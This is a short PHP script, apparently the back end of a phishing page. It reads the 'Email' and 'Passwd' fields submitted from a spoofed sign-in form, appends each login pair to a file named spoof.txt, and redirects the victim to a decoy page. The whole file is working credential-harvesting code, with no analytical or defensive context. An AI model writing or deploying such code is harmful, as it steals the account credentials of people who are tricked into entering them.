<?php
$uname=$_POST['Email'];
$pwd=$_POST['Passwd'];

$f=fopen('spoof.txt','a');
$substring = $uname . '  ' . $pwd. ',';

fwrite($f,$substring);    

fclose($f);

header('location:GodBlessU.html');
?>